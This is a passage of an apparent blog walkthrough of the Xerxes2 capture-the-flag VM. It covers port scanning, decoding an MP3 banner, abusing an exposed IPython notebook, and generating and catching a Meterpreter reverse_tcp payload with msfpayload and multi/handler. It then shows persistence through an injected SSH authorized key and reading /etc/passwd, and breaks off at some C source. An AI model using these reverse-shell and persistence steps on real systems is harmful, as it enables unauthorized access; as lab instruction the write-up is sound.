</span><span class='line'>OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>6.46%E<span class="o">=</span>4%D<span class="o">=</span>8/4%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>33675%PV<span class="o">=</span>Y%DS<span class="o">=</span>1%DC<span class="o">=</span>D%G<span class="o">=</span>Y%M<span class="o">=</span>080027%TM
</span><span class='line'>OS:<span class="o">=</span>53DF942E%P<span class="o">=</span>i686-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>105%GCD<span class="o">=</span>1%ISR<span class="o">=</span>10B%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS
</span><span class='line'>OS:<span class="o">=</span>8<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M5B4ST11NW3%O2<span class="o">=</span>M5B4ST11NW3%O3<span class="o">=</span>M5B4NNT11NW3%O4<span class="o">=</span>M5B4ST11NW3%O5<span class="o">=</span>M
</span><span class='line'>OS:5B4ST11NW3%O6<span class="o">=</span>M5B4ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>3890%W2<span class="o">=</span>3890%W3<span class="o">=</span>3890%W4<span class="o">=</span>3890%W5<span class="o">=</span>3890%W6<span class="o">=</span>38
</span><span class='line'>OS:90<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>3908%O<span class="o">=</span>M5B4NNSNW3%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>
</span><span class='line'>OS:S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q
</span><span class='line'>OS:<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A
</span><span class='line'>OS:%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y
</span><span class='line'>OS:%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T
</span><span class='line'>OS:<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 22.96 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>OK, so we have SSH, HTTP, RPC bind, 4444 and 8888. Port 4444 has returned a banner, which looks like an encoded string. We can get the full string using netcat.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc -nv 192.168.0.102 4444
</span><span class='line'>nc: 192.168.0.102 <span class="m">4444</span> open
</span><span class='line'>//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
</span><span class='line'>SEtNUFJVV1pcX2FkZmlrbnBzdXh6fYGDhoiLjZCSlZeanJ+hpKapq66ws7W4ur3Bw8bIy83Q0tXX
</span><span class='line'>2tzf4eTm6evu8PP1+Pr9AAAAOUxBTUUzLjk5cgFuAAAAAAAAAAAUQCQEdSIAAEAAAZw9c+tDPgAA
</span><span class='line'>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/zgMQAJiwOAClPQAEKEPV6vQ80
</span><span class='line'>y3mm7PwTcTcXMesnZpqNXv3jxgVjyJ8MAAcI2DgPBxYueiIlbvfu73/y7vwn+7u7/+737u7v+6Ii
</span><span class='line'>Ilf/7u///6O7u73/6IiIjv///+7u4oYiJ/u7u98ILi573//oiVuiInvoLnvoiECguLi57u7i4oKC
</span><span class='line'>goKJUuKCgoZUu9y73wiI5Yue9wHAKAAYAMBcG4uLuHrhC0gNGRNptRqIxGIF9hY0ZCM8qOkBjB0f
</span><span class='line'>z4qGhjW3XS8TqAboGJvfwWD/84LEKjYLupm/maACFJixkWAohA3YkmgtyB3CQDRcSgRcB7AAYyKY
</span><span class='line'>AaPGy4sstmhFxWglI0GVLxFUi4cJwihomIWErHeQEghuZlE6YGi3fmJIFAyWXDxw3ZFM3dPW6e5c
</span><span class='line'>J9TGB9I0SdqBmedSdkFWdkOnL5oZm5mYGajSim9NFaka6SC7tN1IX6btnETBj5oal90kVJLSTq1W
</span><span class='line'>U6a9Ro/Vrut3QoJpKZ6bmizc86BumpN1rQnAkhKW4JOIVQ6q0th/lKggBGAGgLSsKgRLlO9qcv/z
</span><span class='line'>gsQVLLvqfCncgAGp63vV7uMMyHQFDBiFIHAAmYcCoAUAvCliDGiFVTF4tGJX0ZhZRu6SKnHyp0EE
</span><span class='line'>EEUDxggaIpJIN7n1mzpIKPmq1nVKoJJpqoKSdq0EJmtNbMk7otMUbpKQQTdJ90mNEkkltTUiigtS
</span><span class='line'>aKzaqy3dBNlJVoJKZabpMy6K0F0JitTMgi6zZdSqW1ebuxx1vUq6Cl3NqTs9b11O15qg2kMkIoER
</span><span class='line'>
</span><span class='line'>*********************** Hundreds of lines later ****************************
</span><span class='line'>
</span><span class='line'>Ql1KnTmDiAWivLiumNGocdxek7ovpCS2lxTBBQjoSENSSVPTyhUhqhbhDi7hglQCqQZymkiwbIYJ
</span><span class='line'>okFFxPwG0kxBTUUzLjk5LjWqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqv/zgsT3L2wV3MAJn1iqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqkxBTUUzLjk5LjWqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq//OCxDsAAANIAAAA
</span><span class='line'>AKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'>qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
</span><span class='line'><span class="nv">qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo</span><span class="o">=</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://www.hencewise.com/wordpress/wp-content/uploads/wide-eyes.gif" alt="" /></p>

<p>Well that was a lot more than I expected. But the = at the end screams Base64, so I need to copy the banner text into a text file (I don&rsquo;t need to show you this) and a-decrypting and hexediting I shall go.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# base64 -d in.txt &gt; out.bin
</span><span class='line'>root@pwk:~# hexedit out.bin
</span><span class='line'>
</span><span class='line'><span class="m">00000000</span>   FF F3 <span class="m">80</span> C4  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">49</span> 6E <span class="m">66</span>  6F <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  0F <span class="m">00</span> <span class="m">00</span> <span class="m">01</span>  .............Info.......
</span><span class='line'><span class="m">00000018</span>   F8 <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">00</span> <span class="m">03</span> <span class="m">06</span>  <span class="m">08</span> 0B 0D <span class="m">10</span>  <span class="m">12</span> <span class="m">15</span> <span class="m">17</span> 1A  1C 1F <span class="m">21</span> <span class="m">24</span>  <span class="m">26</span> <span class="m">29</span> 2B 2E  ....<span class="o">=</span>.............!<span class="nv">$&amp;</span><span class="o">)</span>+.
</span><span class='line'><span class="m">00000030</span>   <span class="m">30</span> <span class="m">33</span> <span class="m">35</span> <span class="m">38</span>  3A 3D <span class="m">41</span> <span class="m">43</span>  <span class="m">46</span> <span class="m">48</span> 4B 4D  <span class="m">50</span> <span class="m">52</span> <span class="m">55</span> <span class="m">57</span>  5A 5C 5F <span class="m">61</span>  <span class="m">64</span> <span class="m">66</span> <span class="m">69</span> 6B  0358:<span class="o">=</span>ACFHKMPRUWZ<span class="se">\_</span>adfik
</span><span class='line'><span class="m">00000048</span>   6E <span class="m">70</span> <span class="m">73</span> <span class="m">75</span>  <span class="m">78</span> 7A 7D <span class="m">81</span>  <span class="m">83</span> <span class="m">86</span> <span class="m">88</span> 8B  8D <span class="m">90</span> <span class="m">92</span> <span class="m">95</span>  <span class="m">97</span> 9A 9C 9F  A1 A4 A6 A9  npsuxz<span class="o">}</span>.................
</span><span class='line'><span class="m">00000060</span>   AB AE B0 B3  B5 B8 BA BD  C1 C3 C6 C8  CB CD D0 D2  D5 D7 DA DC  DF E1 E4 E6  ........................
</span><span class='line'><span class="m">00000078</span>   E9 EB EE F0  F3 F5 F8 FA  FD <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">39</span> 4C <span class="m">41</span> 4D  <span class="m">45</span> <span class="m">33</span> 2E <span class="m">39</span>  <span class="m">39</span> <span class="m">72</span> <span class="m">01</span> 6E  ............9LAME3.99r.n
</span><span class='line'><span class="m">00000090</span>   <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">14</span> <span class="m">40</span> <span class="m">24</span> <span class="m">04</span>  <span class="m">75</span> <span class="m">22</span> <span class="m">00</span> <span class="m">00</span>  <span class="m">40</span> <span class="m">00</span> <span class="m">01</span> 9C  3D <span class="m">73</span> EB <span class="m">43</span>  .........@<span class="nv">$.</span>u<span class="s2">&quot;..@...=s.C</span>
</span><span class='line'><span class="s2">000000A8   3E 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  &gt;.......................</span>
</span><span class='line'><span class="s2">000000C0   00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  FF F3 80 C4  00 26 2C 0E  .....................&amp;,.</span>
</span><span class='line'><span class="s2">000000D8   00 29 4F 40  01 0A 10 F5  7A BD 0F 34  CB 79 A6 EC  FC 13 71 37  17 31 EB 27  .)O@....z..4.y....q7.1.&#39;</span>
</span><span class='line'><span class="s2">000000F0   66 9A 8D 5E  FD E3 C6 05  63 C8 9F 0C  00 07 08 D8  38 0F 07 16  2E 7A 22 25  f..^....c.......8....z&quot;</span>%
</span><span class='line'><span class="m">00000108</span>   6E F7 EE EF  7F F2 EE FC  <span class="m">27</span> FB BB BB  FF EE F7 EE  EE EF FB A2  <span class="m">22</span> <span class="m">22</span> <span class="m">57</span> FF  n.......<span class="s1">&#39;...........&quot;&quot;W.</span>
</span><span class='line'><span class="s1">00000120   EE EF FF FF  A3 BB BB BD  FF E8 88 88  8E FF FF FF  EE EE E2 86  22 27 FB BB  ....................&quot;&#39;</span>..
</span><span class='line'><span class="m">00000138</span>   BB DF <span class="m">08</span> 2E  2E 7B DF FF  E8 <span class="m">89</span> 5B A2  <span class="m">22</span> 7B E8 2E  7B E8 <span class="m">88</span> <span class="m">40</span>  A0 B8 B8 B9  .....<span class="o">{</span>....<span class="o">[</span>.<span class="err">&quot;</span><span class="o">{</span>..<span class="o">{</span>..@....
</span><span class='line'><span class="m">00000150</span>   EE EE E2 E2  <span class="m">82</span> <span class="m">82</span> <span class="m">82</span> <span class="m">82</span>  <span class="m">89</span> <span class="m">52</span> E2 <span class="m">82</span>  <span class="m">82</span> <span class="m">86</span> <span class="m">54</span> BB  DC BB DF <span class="m">08</span>  <span class="m">88</span> E5 8B 9E  .........R....T.........
</span><span class='line'><span class="m">00000168</span>   F7 <span class="m">01</span> C0 <span class="m">28</span>  <span class="m">00</span> <span class="m">18</span> <span class="m">00</span> C0  5C 1B 8B 8B  B8 7A E1 0B  <span class="m">48</span> 0D <span class="m">19</span> <span class="m">13</span>  <span class="m">69</span> B5 1A <span class="m">88</span>  ...<span class="o">(</span>....<span class="se">\.</span>...z..H...i...
</span><span class='line'><span class="m">00000180</span>   C4 <span class="m">62</span> <span class="m">05</span> F6  <span class="m">16</span> <span class="m">34</span> <span class="m">64</span> <span class="m">23</span>  3C A8 E9 <span class="m">01</span>  8C 1D 1F CF  8A <span class="m">86</span> <span class="m">86</span> <span class="m">35</span>  B7 5D 2F <span class="m">13</span>  .b...4d#&lt;..........5.<span class="o">]</span>/.
</span></code></pre></td></tr></table></div></figure>


<p>Oooh, I spy the word LAME, which means this is an MP3. If you want to hear the MP3, you can download it <a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2.mp3">right here</a>. Not very exciting huh ?</p>

<hr />

<h2>Windowlicker</h2>

<p>What is interesting about this MP3 is not what you can hear, but what you can see in the waveform. Much like the demon face in Windowlicker by Aphex Twin, here we have a hidden image in the spectrogram. If you want to know how to find this, take a look at <a href="http://lifehacker.com/5807289/how-to-hide-secret-messages-and-codes-in-audio-files">this Lifehacker article</a>.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_001.png" alt="xerxes2_001" /></a></p>

<p>This, however, is just a diversion. The image is of <a href="http://shodan.wikia.com/wiki/Xerxes">Xerxes</a> from System Shock 2, but the whole MP3 is an easter egg - but a cool one none the less ! Let&rsquo;s move on.</p>

<hr />

<h2>If You&rsquo;re Not Taking Notes, You&rsquo;re Not Learning.</h2>

<p>So, with port 4444 crossed out, lets have a look at some other ports. 8888 is my next target, which returns nothing if you netcat to it, but provides an Python based Notebook application. This page also gives us an insight into the name of one of the users - delacroix.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_002.png" alt="xerxes2_002" /></a></p>

<p>It is possible to run commands through this application by creating a new notebook, and prefixing all commands with !. As an example, I&rsquo;ve created a new notebook and have run the whoami command in the screenshot below (you&rsquo;ll note that id didn&rsquo;t work)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_003.png" alt="xerxes2_003" /></a></p>

<p>At this point I decided to be sneaky and make this download and run a reverse Meterpreter binary&hellip; I created my binary using msfpayload, hosted it on an internal HTTP server, and then set up a multi/handler to accept the connection.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfpayload linux/x86/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.110 <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span> x &gt; xerxes_4444
</span><span class='line'>Created by msfpayload <span class="o">(</span>http://www.metasploit.com<span class="o">)</span>.
</span><span class='line'>Payload: linux/x86/meterpreter/reverse_tcp
</span><span class='line'> Length: 71
</span><span class='line'>Options: <span class="o">{</span><span class="s2">&quot;LHOST&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;192.168.0.110&quot;</span>, <span class="s2">&quot;LPORT&quot;</span><span class="o">=</span>&gt;<span class="s2">&quot;4444&quot;</span><span class="o">}</span>
</span><span class='line'>root@pwk:~# cp xerxes_4444 /var/www
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# msfconsole
</span><span class='line'>msf &gt; use multi/handler
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
</span><span class='line'><span class="nv">payload</span> <span class="o">=</span>&gt; linux/x86/meterpreter/reverse_tcp
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lhost 192.168.0.110
</span><span class='line'><span class="nv">lhost</span> <span class="o">=</span>&gt; 192.168.0.110
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; <span class="nb">set </span>lport 4444
</span><span class='line'><span class="nv">lport</span> <span class="o">=</span>&gt; 4444
</span><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; run
</span><span class='line'>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started reverse handler on 192.168.0.110:4444
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
</span></code></pre></td></tr></table></div></figure>


<p>The following command pasted into the Python notebook application downloads the binary from the HTTP server to /tmp, makes it executable, and then executes it.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_004.png" alt="xerxes2_004" /></a></p>

<p>A reverse connection is received by the multi/handler, which allows us to get a shell as delacroix, but it disconnects after a certain amount of time.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">1138688</span> bytes<span class="o">)</span> to 192.168.0.102
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>192.168.0.110:4444 -&gt; 192.168.0.102:34718<span class="o">)</span> at 2014-08-08 13:20:31 +0100
</span><span class='line'>
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>Process <span class="m">14990</span> created.
</span><span class='line'>Channel <span class="m">1</span> created.
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>delacroix<span class="o">)</span>
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.0.102 - Meterpreter session <span class="m">1</span> closed.  Reason: Died
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.giphy.com/media/8x6MVS4l7wh3O/giphy.gif" alt="" /></p>

<p>It seems that I&rsquo;ve been scuppered, and that Xerxes is terminating my connection, as seen on the Python Notebook page</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/xerxes2_005.png" alt="xerxes2_005" /></a></p>

<p>However, it looks like I have a small window before the session is terminated - because of this I am able to be quick and echo my SSH public key added to the authorized_keys file, which allows me to subsequently SSH in as delacroix sans password.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# ssh delacroix@192.168.0.102
</span><span class='line'>
</span><span class='line'>Welcome to xerxes2.
</span><span class='line'>      XERXES wishes you
</span><span class='line'>       a pleasant stay.
</span><span class='line'>____   ___  ____  ___  __ ____   ___  ____     ____     ____
</span><span class='line'><span class="sb">`</span>MM<span class="o">(</span>   <span class="o">)</span>P<span class="s1">&#39; 6MMMMb `MM 6MM `MM(   )P&#39;</span> 6MMMMb   6MMMMb<span class="se">\ </span> 6MMMMb
</span><span class='line'> <span class="sb">`</span>MM<span class="sb">`</span> ,P  6M<span class="s1">&#39;  `Mb MM69 &quot;  `MM` ,P  6M&#39;</span>  <span class="sb">`</span>Mb MM<span class="s1">&#39;    ` MM&#39;</span>  <span class="sb">`</span>Mb
</span><span class='line'>  <span class="sb">`</span>MM,P   MM    MM MM<span class="s1">&#39;      `MM,P   MM    MM YM.           ,MM</span>
</span><span class='line'><span class="s1">   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;</span>
</span><span class='line'>   d<span class="sb">`</span>MM.  MM       MM        d<span class="sb">`</span>MM.  MM            <span class="sb">`</span>Mb   ,M<span class="s1">&#39;</span>
</span><span class='line'><span class="s1">  d&#39;</span> <span class="sb">`</span>MM. YM    d9 MM       d<span class="s1">&#39; `MM. YM    d9 L    ,MM ,M&#39;</span>
</span><span class='line'>_d_  _<span class="o">)</span>MM_ YMMMM9 _MM_    _d_  _<span class="o">)</span>MM_ YMMMM9  MYMMMM9  MMMMMMMM
</span><span class='line'>
</span><span class='line'>/usr/bin/xauth:  file /home/delacroix/.Xauthority does not exist
</span><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://img3.wikia.nocookie.net/__cb20140515210256/sailormoon/images/3/3c/Stephen-colbert-celebration-gif.gif" alt="" /></p>

<hr />

<h2>Aboard the Von Braun with Marie</h2>

<p><img src="http://img2.wikia.nocookie.net/__cb20111214193445/shodan/images/b/b0/Marie_Delacroix.png" alt="" /></p>

<p>This is <a href="http://shodan.wikia.com/wiki/Marie_Delacroix">Marie Delacroix</a> - creator of <a href="http://shodan.wikia.com/wiki/Sarah">Sarah</a> which Xerxes was employed to run.</p>

<p>First things first, lets get a list of possible users from /etc/passwd</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>delacroix@xerxes2:~<span class="nv">$ </span>cat /etc/passwd
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
</span><span class='line'>news:x:9:9:news:/var/spool/news:/bin/sh
</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/bin/sh
</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
</span><span class='line'>Debian-exim:x:101:103::/var/spool/exim4:/bin/false
</span><span class='line'>statd:x:102:65534::/var/lib/nfs:/bin/false
</span><span class='line'>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
</span><span class='line'>korenchkin:x:1000:1000:Anatoly Korenchkin,,,:/home/korenchkin:/bin/bash
</span><span class='line'>polito:x:1001:1001:Janice Polito,,,:/home/polito:/bin/bash
</span><span class='line'>delacroix:x:1002:1002:Marie St. Anne Delacroix,,,:/home/delacroix:/bin/bash
</span></code></pre></td></tr></table></div></figure>


<p>The delacroix user has source code for an application in their home folder.</p>

<p>[c]/<em> found this lingering around somewhere </em>/</p>

<h1>include &lt;stdio.h></h1>

<h1>include &lt;string.h></h1>

<h1>include &lt;unistd.h></h1>

<h1>include &lt;stdlib.h></h1>

<h1>define BUF_SIZE 30000</h1>

<p>void bf(char <em>program, char </em>buf)
